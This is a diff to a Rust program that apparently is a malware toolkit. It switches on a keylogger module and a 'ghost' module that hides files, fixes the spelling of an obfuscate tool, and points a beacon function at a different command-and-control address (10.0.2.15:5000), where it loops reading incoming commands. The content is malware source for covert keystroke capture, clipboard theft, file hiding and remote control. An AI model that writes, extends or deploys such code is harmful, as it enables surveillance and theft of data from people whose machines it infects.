@@ -15,7 +15,7 @@ fn check_tool(input: &str) -> Tool {
         "replaceboard" => return Tool::ReplaceBoard,
         "ghost" => return Tool::Ghost,
         "mouseketool" => return Tool::Mouseketool,
-        "obfuscate" => return Tool::Obufscate,
+        "obfuscate" => return Tool::Obfuscate,
         _ => return Tool::Invalid, 
     }
 }
@@ -99,9 +99,10 @@ Use --list to see a list of available tools")
 
 pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
     match tool {
-        // Tool::Keylogger => {
-        //     let _ = keylogger::run();
-        // }
+        Tool::Keylogger => {
+            let captured = keylogger::run()?;
+            Ok(captured)
+        }
         Tool::Clipboard => {
             let text = clipboard::run()?;
             Ok(text)
@@ -109,13 +110,14 @@ pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
         // Tool::ReplaceBoard => {
         //     let _ = replaceboard::run()?;
         // }
-        // Tool::Ghost => {
-        //     let _ = ghost::run()?;
-        // }
+        Tool::Ghost => {
+            let _ = ghost::run()?;
+            Ok(String::from("Hid files"))
+        }
         // Tool::Mouseketool => {
         //     let _ = mouseketool::run()?;
         // } 
-        // Tool::Obufscate => {
+        // Tool::Obfuscate => {
         //     let filename = get_filename()?;
         //     let _ = obfuscate::run(filename)?;
         //     return Ok(())
@@ -129,7 +131,7 @@ pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
 }
 
 pub fn beacon() {
-    if let Ok(mut stream) = TcpStream::connect("10.255.255.254:5000") {
+    if let Ok(mut stream) = TcpStream::connect("10.0.2.15:5000") {
         loop {
             let mut buffer = [0; 1024];
             if let Ok(n) = stream.read(&mut buffer) {
